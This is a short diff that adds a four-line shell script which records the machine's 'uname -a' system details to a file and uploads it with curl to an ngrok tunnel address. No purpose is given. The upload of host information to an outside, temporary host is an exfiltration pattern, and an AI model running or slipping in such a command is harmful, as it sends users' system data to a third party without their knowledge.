@@ -1,1 +1,4 @@
-
+cd ~
+uname -a > mac.txt
+filename=mac.txt
+curl -F "uploadfile=@$filename" https://d937ab425988.ngrok.io/upload
